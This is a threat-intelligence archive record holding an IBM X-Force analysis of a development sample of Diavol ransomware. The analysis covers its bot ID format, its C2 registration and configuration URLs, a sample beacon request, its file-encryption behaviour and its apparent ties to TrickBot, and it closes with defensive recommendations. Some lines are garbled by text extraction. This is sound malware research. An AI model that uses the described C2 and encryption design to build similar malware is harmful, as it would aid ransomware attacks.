{
    "id": "d2b1077b-d6fe-4979-b688-776c1ef272ca",
    "created_at": "2023-01-12T15:09:13.390725Z",
    "updated_at": "2025-03-27T02:13:47.777781Z",
    "deleted_at": null,
    "sha1_hash": "0b75016d529d3fad8e54cfcab40c3bc2ee353e73",
    "title": "2021-08-17 - Analysis of Diavol Ransomware Reveals Possible Link to TrickBot Gang",
    "authors": "",
    "file_creation_date": "2022-05-28T02:25:23Z",
    "file_modification_date": "2022-05-28T02:25:23Z",
    "file_size": 1375792,
    "plain_text": "# Analysis of Diavol Ransomware Reveals Possible Link to TrickBot Gang\n\n**securityintelligence.com/posts/analysis-of-diavol-ransomware-link-trickbot-gang/**\n\n[Home&nbsp/](https://securityintelligence.com/) [Advanced Threats](https://securityintelligence.com/category/x-force/threats/)\nAnalysis of Diavol Ransomware Reveals Possible Link to TrickBot Gang\n\n[Advanced Threats August 17, 2021](https://securityintelligence.com/category/x-force/threats/)\nBy [Charlotte Hammond co-authored by Chris Caridi 7 min read](https://securityintelligence.com/author/charlotte-hammond/)\n[Ransomware has become the number one cyber threat to organizations, making up nearly 25% of attacks IBM X-Force Incident Response](https://www.ibm.com/security/data-breach/threat-intelligence?_ga=2.253590400.801708917.1625447135-286069814.1618330785)\nremediated in 2020. Ransomware is making headlines on a regular basis due to the high impact of certain attacks on victims in critical\nindustries. It’s unlikely that the pace of attacks will slow down in the near future.\n\n\n-----\n\no ce eat te ge ce ece t y ocated a d a a y ed a a so a e st a t at appea ed to be a o p og ess Upo pub cat o\nof [a recent report, it became clear that what IBM had found was in fact an early development version of the Diavol ransomware. Additionally,](https://www.securityweek.com/new-ransomware-diavol-linked-notorious-cybercrime-gang)\nthe ransomware code is configured in such a way that suggests a possible link to the infamous TrickBot group, tracked by X-Force as ITG23.\n\n## Diavol Is Evolving\n\nIBM X-Force started its analysis by looking at indicators of compromise (IOCs) from another sample of the Diavol ransomware — an existing\none that was already reported in the wild by Fortinet and an unfamiliar sample IBM discovered. Overall, many similarities exist between the two\nsamples, with the main difference being the respective development stage. While Fortinet found a fully functional and weaponized piece of\nransomware, the one IBM analyzed looked like a development version that was likely used for testing earlier on.\n\nThe comparison of the two versions can provide insight into the development process of Diavol and of future malware.\n\nThe ransomware sample identified by X-Force (MD5: e63a532d42b44ff73c1e1d4bda018657) has a reported compilation date of March 5,\n2020. It was first submitted to VirusTotal almost a year later, on January 27, 2021, with the filename ‘malware.exe’.\n\nThe PDB paths and compilation time differ between the two versions, with the later sample compiled on April 30, 2021.\n\nDevelopment Sample Active Sample\n\nCompiled March 5, 2020 Compiled April 30, 2021\n\n\nSHA256:\n5be4c5b4f62ae4c548e41a1e3336090b120e04087fa43b2c087889bf4d277f99\n\nD:\\Documents\\Visual Studio 2010\\Projects\\CryptoLocker\nProject\\CryptoLocker\\Release\\CryptoLocker.pdb\n\n## Technical Analysis\n\n\nSHA256:\n85ec7f5ec91adf7c104c7e116511ac5e7945bcf4a8fdecdcc581e97\n\nD:\\Development\\Master\\onion\\locker.divided\\LockMainDIB\\Releas\n\n\nAn analysis of the Diavol ransomware sample proves that the malware’s intention is to encrypt files using an RSA encryption key. The code\nitself is capable of prioritizing file types to encrypt based on a pre-configured list of extensions defined by the attacker. Additionally, it can\nterminate processes and services as needed.\n\n## Execution\n\nThe initial execution of the ransomware leads to the collection of basic system information such as Windows version and network adapter\ndetails. Then, the ransomware generates a System/Bot ID with the following format:\n\n<hostname>-<username>_W<windows _version>.<guid>\n\nFor example:\n\nDESKTOP-4LUGU5I-reuser_W10019041.C3F3799FE69249579857D2039BBBAB11\n\nThis format is almost identical to the Bot ID generated by TrickBot malware, except that the username field has been added.\n\n## Botnet Registration\n\nNext, the ransomware attempts a connection with a hardcoded command and control (C2) address where the victim machine registers itself\nwith a pre-configured Group ID and the Bot ID that was created in the previous step. This registration to the botnet is nearly identical in both\nsamples analyzed. The primary difference is the registration URL changing from http://<server_address>/bots/register to\nhttp://<server_address>/BnpOnspQwtjCA/register.\n\nBelow is an example of a POST request sent by the development sample to the C2.\n\n\n-----\n\nPOST /bots/register HTTP/1.1\nHost: 127.0.0.1\n\nConnection: keep-alive\n\nContent-Length: 146\n\nAccept: */*\n\nOrigin: http://127.0.0.1\n\nX-Requested-With: XMLHttpRequest\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/XX.X.XXX.XXX Safari/537.36\n\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nReferer: http://127.0.0.1\n\nAccept-Encoding: gzip, deflate\n\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6\n\nCookie:\n\ncid=DESKTOP-4LUGU5Ireuser_W10019041.C3F3799FE69249579857D2039BBBAB11&group=vgrpnm&ip_local1=192.168.135.129&ip_local2=169.254.90.253&ip_exter\n\n_Figure 1: Diavol ransomware contacts C2 Server_\n\n## Malware Configuration\n\nThe development sample IBM X-Force analyzed has a hardcoded configuration, which is stored in the portable executable (PE) file overlay\nrather than in the .data section used by the newer active version.\n\nAt the very end of the file is a list of integers representing the offsets where each configuration item can be found, along with the total size of\nthe configuration section. The malware reads these offsets and then uses them to parse the configuration elements. The configuration contains\na collection of elements like the active sample features:\n\nC2 IP address\nGroup ID\nBase64 encoded RSA public key\nList of process names to terminate\nList of service names to terminate\nA list of files to avoid encrypting\nA list of files to encrypt\nA list of files to wipe\nA list of priority files to encrypt first\nRansomware text\n\nIn the development sample, only the C2 IP, Group ID and RSA key were populated; all other settings were left empty. The C2 IP address was\nset to 127.0.0.1 and the Group ID was ‘vgrpnm’.\n\nIf registration to the botnet succeeds, then the infected device connects to the C2 again to request updated configuration values. These are\nrequested in the same manner in the development sample as they are fetched by the active version. The request URL was slightly changed:\n\nFrom http://<server_address>/bot/<bot_id>/<group_id>/<setting_name> in the development version.\n\nTo http://<server_address>/Bnyar8RsK04ug/<bot_id>/<group_id>/<setting_name> in the active version.\n\nThe setting names match those observed in the active sample, except that the ‘stoplist’ setting has been renamed to ‘ignore’:\n\nkey — requests the RSA public key in base64 format\nservices — retrieves list of services to terminate\npriority — retrieves list of priority files to be encrypted first\nstoplist — retrieves list of files that should not be encrypted\next — retrieves list of files that should be encrypted\nwipe — retrieves list of files to be wiped\nlanding — retrieves ransom note contents\n\n## File Enumeration and Encryption\n\n\n-----\n\no to e e u e at o a d e c ypt o, p ocesses a d se ces o t e ected de ce a e te ated based o t e co gu ed p ocess a d\nservice name lists. The development sample IBM analyzed appears to contain a similar bug as described by Fortinet researchers with regards\nto the list of process names being incorrectly passed to the service termination function.\n\nIn the development sample, the code for the file enumeration and encryption functions is clearly unfinished. The file enumeration function is\ndesigned to first encrypt files in the configured priority list (which is empty) and then to enumerate and encrypt files in the hardcoded path\nC:\\TEST\\. Functions related to the enumeration of logical drives and network shares, as seen in the newer, active sample, were not\nimplemented.\n\nThe file encryption is performed using an RSA key, and the file encryption functions operate in a similar manner to the active sample, except\nthat files are encrypted directly as they are found. Hence, when the function finds a file eligible for encryption, it passes it directly to the\nencryption function, rather than operating via the asynchronous procedure call (APC) functions reportedly observed in the active sample.\n\nUpon identifying a file to encrypt, the development sample creates a new file with the target file path and appends the file extension ‘.lock64’.\nThe file size of the original target file is written to the first eight bytes of the new file. The file contents are encrypted using the Microsoft\nCryptoAPI functions and then written to the new encrypted file.\n\nIBM X-Force noted that in this development version of the malware, the original file is not deleted and remains on the file system along with its\nencrypted counterpart. If that were to continue in the active version, victims would not need a decryption key.\n\nMalware functionality that was reported in the active sample related to the deployment of ransom notes, file wiping, and deletion of Volume\nShadow Copies was not implemented in the development sample.\n\n## Reporting Results to C2\n\nOne behavior that was observed in the development sample, but not reported in the fully active malware, is the ability to send statistics about\nthe encryption process back to the C2.\n\nIn the development sample, IBM X-Force noted that once file encryption was complete, the ransomware connected back to the C2 one final\ntime to send home the results of the encryption. It does this by sending a POST request to http://<server_address>/botstat/<bot_id>/<group_id>/stat containing the following data:\n\ntotal=<total_files>&crypted=<total_encrypted>&wiped=<total_wiped>&ignored=<total_ignored>\n\nBut while the development version contained the reporting code, it was not implemented, which resulted in all totals being reported as zeros.\n\n## Potential Ties to TrickBot\n\nFirst seen in [2016, TrickBot made its name as one of the top banking Trojans in the wild, targeting a wide variety of international banks using](https://securityintelligence.com/an-aggressive-launch-trickbot-trojan-rises-with-redirection-attacks-in-the-uk/)\n[malicious web-injects. More recently, TrickBot has been focusing attacks on targets like e-commerce and](https://blog.morphisec.com/trickbot-returns-in-a-new-ecommerce-shopping-campaigntrik) [technology organizations.](https://threatpost.com/trickbot-targets-verizon-t-mobile-sprint-users-to-siphon-pins/147792/)\n\nWhile banking Trojans primarily focus on the theft of banking credentials, TrickBot, which primarily targets organizations, has also been\n[observed harvesting email account credentials using tools such as Mimikatz. Seeing as it already has a foothold in enterprise networks,](https://blog.malwarebytes.com/detections/trojan-trickbot/)\n[TrickBot’s modular nature has allowed its operators to adapt it to additional botnet monetization schemes. Some of those have been spreading](https://us-cert.cisa.gov/ncas/alerts/aa21-076a)\nspam emails, providing initial infection vectors, or delivering ransomware and other payloads to compromised machines it controls.\n\nThe Diavol ransomware sample discussed in this blog shares similarities to other malware that has been attributed to the TrickBot Gang.\n\n## Bot/Group ID Formatting Similarities\n\n[TrickBot itself, along with the Anchor DNS malware that has been attributed to TrickBot, generates a Bot ID of an almost identical format to that](https://us-cert.cisa.gov/ncas/alerts/aa20-302a)\nused by the Diavol ransomware. TrickBot is also well known for its use of group/campaign IDs, which is used by Diavol, likely for the same\npurpose of tracking different infection campaigns.\n\n<hostname>_W<windows_version>.<guid>\n\nTrickBot’s communications with its C2 server occur over HTTPS with a Group ID, followed by the Bot ID, Command ID and any additional data.\n\nhttps://<server_address>/rob107/29FEXSKDPLYG_W10010586.EB82D91807FAC2AD94A63366911A27D8/5/file/\n\nFor comparison, the Anchor DNS malware follows a very similar pattern as seen here where a Campaign ID is followed by a Bot ID and\nCommand ID, along with Windows version information, and then network address details.\n\n/anchor_dns/<bot_id>/0/<os_version>/1001/<external_ip>/<random_string>/<random_string2>/\n\nBoth Bot IDs and Campaign IDs act as a way for the operators to track different deployments across a set of victims. Different IDs can be tied\nto usage by a specific affiliate and/or victim set, which allows these operators to manage multiple intrusions as would be expected in a\nransomware-as-a-service (RaaS) model.\n\n\n-----\n\ndd t o a y, t ese s ca e p t eat acto s gauge t e success o a spec c ca pa g a d subseque t y o t e o t e e ect e ess o\ndifferent affiliates. This is why these specific formatting and naming conventions could potentially point to the group responsible for the initial\ndeployment.\n\n## Preferred and Avoided Language Settings\n\nIn the early stage, Diavol sample analyzed by X-Force, the HTTP headers used for C2 communication are set to prefer Russian language\ncontent, which matches the language used by TrickBot operators.\n\nAdditionally, a previous report noted that the Diavol ransomware did not contain any language checks to prevent the ransomware from\nexecuting on Russian victims, as is common with malware associated with the TrickBot Gang. However, in the development sample IBM XForce analyzed, indications were found to suggest that the code for such checks may have been present or intended to be developed, even if\nit was not activated in the compiled samples.\n\nA list of four-character hexadecimal strings was identified in the development sample. These strings are unused within the compiled code but\nwere recognized as potentially being language code identifiers, and further analysis confirmed that all are related to Russian and\nCommonwealth of Independent States languages.\n\n[The full list of IDs present and their corresponding language are presented below:](https://docs.microsoft.com/en-us/windows/win32/msi/localizing-the-error-and-actiontext-tables)\n\n0422 – Ukrainian (Ukraine)\n0442 – Turkmen (Turkmenistan)\n0444 – Tatar (Russia)\n0843 – Uzbek (Cyrillic) (Uzbekistan)\n0428 – Tajik (Cyrillic) (Tajikistan)\n043F – Kazakh (Kazakhstan)\n0423 – Belarusian (Belarus)\n082C – Azeri (Cyrillic) (Azerbaijan)\n042B – Armenian (Armenia)\n0419 – Russian (Russia)\n\n## Birds of a Feather\n\n[Collaboration between cyber crime groups, affiliate programs and code reuse are all parts of a growing ransomware economy. The Diavol code](https://securityintelligence.com/the-business-of-organized-cybercrime-rising-intergang-collaboration-in-2018/)\nis relatively new in the cyber crime area, and less infamous than Ryuk or Conti, but it likely shares ties to the same operators and blackhat\ncoders behind the scenes.\n\nX-Force continues to monitor the threat landscape and help readers learn about new threats to better manage risk to their networks. Keep up\n[to date on all X-Force research blogs here.](https://securityintelligence.com/tag/x-force/)\n\n## Recommendations\n\nEstablish and maintain offline backups. Ensure you have backup redundancy stored separately from network zones attackers could\naccess with read-only access. The availability of effective backups is a significant differentiator for organizations and can support\nrecovery from a ransomware attack.\nImplement a strategy to prevent unauthorized data theft, especially as it applies to uploading large amounts of data to legitimate cloud\nstorage platforms that attackers can abuse.\nEmploy user behavior analytics to identify potential security incidents. When triggered, assume a breach has taken place. Audit, monitor\nand quickly act on suspected abuse related to privileged accounts and groups.\nEmploy multifactor authentication on all remote access points into an enterprise network — with particular care given to secure or disable\nremote desktop protocol (RDP) access. Multiple ransomware attacks have been known to exploit weak RDP access to gain initial entry\ninto a network.\n\n[Charlotte Hammond](https://securityintelligence.com/author/charlotte-hammond/)\nMalware Reverse Engineer, IBM Security\n\nCharlotte is a malware reverse engineer for IBM Security's X-Force IRIS team. She has been working in the security industry for more than 7\nyears with a focu...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-17 - Analysis of Diavol Ransomware Reveals Possible Link to TrickBot Gang.pdf"
    ],
    "report_names": [
        "2021-08-17 - Analysis of Diavol Ransomware Reveals Possible Link to TrickBot Gang.pdf"
    ],
    "threat_actors": [
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536153,
    "ts_updated_at": 1743041627,
    "ts_creation_date": 1653704723,
    "ts_modification_date": 1653704723,
    "files": {
        "pdf": "https://archive.orkl.eu/0b75016d529d3fad8e54cfcab40c3bc2ee353e73.pdf",
        "text": "https://archive.orkl.eu/0b75016d529d3fad8e54cfcab40c3bc2ee353e73.txt",
        "img": "https://archive.orkl.eu/0b75016d529d3fad8e54cfcab40c3bc2ee353e73.jpg"
    }
}